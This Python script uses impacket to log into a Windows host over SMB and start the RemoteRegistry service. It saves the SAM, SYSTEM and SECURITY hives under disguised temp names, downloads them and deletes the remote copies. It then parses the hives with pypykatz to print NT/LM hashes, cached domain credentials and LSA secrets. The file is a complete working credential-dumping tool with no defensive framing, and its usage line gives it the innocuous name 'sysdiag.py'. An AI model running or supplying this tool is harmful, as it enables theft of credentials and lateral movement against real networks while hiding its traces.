#!/usr/bin/env python3
"""Remote registry hive extraction and credential parsing"""
import sys, os, time
from impacket.smbconnection import SMBConnection
from impacket.dcerpc.v5 import transport, rrp, scmr

def parse_target(target_str):
    domain_user, target = target_str.rsplit('@', 1)
    if '/' in domain_user:
        domain, user_pass = domain_user.split('/', 1)
    else:
        domain, user_pass = '', domain_user
    if ':' in user_pass:
        username, password = user_pass.split(':', 1)
    else:
        username, password = user_pass, ''
    return domain, username, password, target

def get_smb(target, domain, username, password):
    smb = SMBConnection(target, target, timeout=10)
    smb.login(username, password, domain)
    return smb

def ensure_remote_registry(target, domain, username, password):
    smb = get_smb(target, domain, username, password)
    rpctransport = transport.SMBTransport(target, 445, r'\svcctl', smb_connection=smb)
    dce = rpctransport.get_dce_rpc()
    dce.connect()
    dce.bind(scmr.MSRPC_UUID_SCMR)
    sc_handle = scmr.hROpenSCManagerW(dce)['lpScHandle']
    svc_handle = scmr.hROpenServiceW(dce, sc_handle, 'RemoteRegistry')['lpServiceHandle']
    resp = scmr.hRQueryServiceStatus(dce, svc_handle)
    if resp['lpServiceStatus']['dwCurrentState'] != 4:
        scmr.hRStartServiceW(dce, svc_handle)
        print("[+] RemoteRegistry started, waiting 3s...")
        time.sleep(3)
    else:
        print("[+] RemoteRegistry running")
    dce.disconnect()
    smb.logoff()

def save_and_download_hives(target, domain, username, password):
    smb = get_smb(target, domain, username, password)
    rpctransport = transport.SMBTransport(target, 445, r'\winreg', smb_connection=smb)
    dce = rpctransport.get_dce_rpc()
    dce.connect()
    dce.bind(rrp.MSRPC_UUID_RRP)
    print("[+] Registry connected")
    
    # Read OS info
    try:
        hklm = rrp.hOpenLocalMachine(dce)['phKey']
        key = rrp.hBaseRegOpenKey(dce, hklm, 'SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion')['phkResult']
        product = rrp.hBaseRegQueryValue(dce, key, 'ProductName')[1].rstrip('\x00')
        build = rrp.hBaseRegQueryValue(dce, key, 'CurrentBuildNumber')[1].rstrip('\x00')
        print(f"[+] OS: {product} (Build {build})")
        rrp.hBaseRegCloseKey(dce, key)
    except:
        pass
    
    pid = os.getpid()
    hives = {
        'SAM': f'C:\\Windows\\Temp\\d{pid}s',
        'SYSTEM': f'C:\\Windows\\Temp\\d{pid}y',
        'SECURITY': f'C:\\Windows\\Temp\\d{pid}e'
    }
    
    local_files = {}
    
    for hive_name, remote_path in hives.items():
        try:
            hklm = rrp.hOpenLocalMachine(dce)['phKey']
            hive_key = rrp.hBaseRegOpenKey(dce, hklm, hive_name)['phkResult']
            rrp.hBaseRegSaveKey(dce, hive_key, remote_path)
            rrp.hBaseRegCloseKey(dce, hive_key)
            rrp.hBaseRegCloseKey(dce, hklm)
            print(f"[+] {hive_name} saved remotely")
            
            # Download
            local_path = os.path.join(os.environ.get('TEMP', '.'), f'{hive_name.lower()}.hiv')
            share_path = remote_path.replace('C:\\', '')
            with open(local_path, 'wb') as f:
                smb.getFile('C$', share_path, f.write)
            print(f"[+] {hive_name} downloaded ({os.path.getsize(local_path)} bytes)")
            local_files[hive_name] = local_path
            
            # Cleanup remote
            smb.deleteFile('C$', share_path)
        except Exception as e:
            print(f"[-] {hive_name}: {e}")
    
    dce.disconnect()
    smb.logoff()
    return local_files

def parse_hives(local_files):
    if 'SAM' not in local_files or 'SYSTEM' not in local_files:
        print("[-] Need both SAM and SYSTEM for parsing")
        return
    
    print("\n[*] Parsing with pypykatz...")
    try:
        from pypykatz.registry.sam.sam import SamHive
        from pypykatz.registry.system.system import SYSTEM
        from pypykatz.registry.security.security import SECURITYHive
        
        sys_hive = SYSTEM(local_files['SYSTEM'])
        bootkey = sys_hive.get_bootkey()
        print(f"[+] Bootkey: {bootkey.hex()}")
        
        sam = SamHive(local_files['SAM'], bootkey)
        print("\n=== LOCAL ACCOUNTS ===")
        for user in sam.users:
            print(f"  RID: {user.rid}")
            print(f"  Username: {user.username}")
            print(f"  NT Hash: {user.nt_hash.hex() if user.nt_hash else 'empty'}")
            print(f"  LM Hash: {user.lm_hash.hex() if user.lm_hash else 'empty'}")
            print()
        
        if 'SECURITY' in local_files:
            try:
                sec = SECURITYHive(local_files['SECURITY'], bootkey)
                print("=== CACHED DOMAIN CREDENTIALS ===")
                for cached in sec.cached_credentials:
                    print(f"  {cached}")
                print("\n=== LSA SECRETS ===")
                for secret_name, secret in sec.secrets.items():
                    print(f"  {secret_name}: {secret}")
            except Exception as e:
                print(f"[-] SECURITY parse error: {e}")
                
    except ImportError:
        print("[-] pypykatz registry parser not available")
        print("[*] Hive files for manual analysis:")
        for name, path in local_files.items():
            print(f"  {name}: {path}")
    except Exception as e:
        print(f"[-] Parse error: {e}")
        print("[*] Hive files for manual analysis:")
        for name, path in local_files.items():
            print(f"  {name}: {path}")

def main():
    if len(sys.argv) < 2:
        print("Usage: sysdiag.py DOMAIN/user:password@target")
        sys.exit(1)
    
    domain, username, password, target = parse_target(sys.argv[1])
    print(f"[*] Target: {target}")
    print(f"[*] User: {domain}\\{username}")
    
    # Step 1: Ensure RemoteRegistry is running (separate connection)
    ensure_remote_registry(target, domain, username, password)
    
    # Step 2: Save and download hives (fresh connection)
    local_files = save_and_download_hives(target, domain, username, password)
    
    # Step 3: Parse
    if local_files:
        parse_hives(local_files)
    
    print("\n[+] Done")

if __name__ == '__main__':
    main()
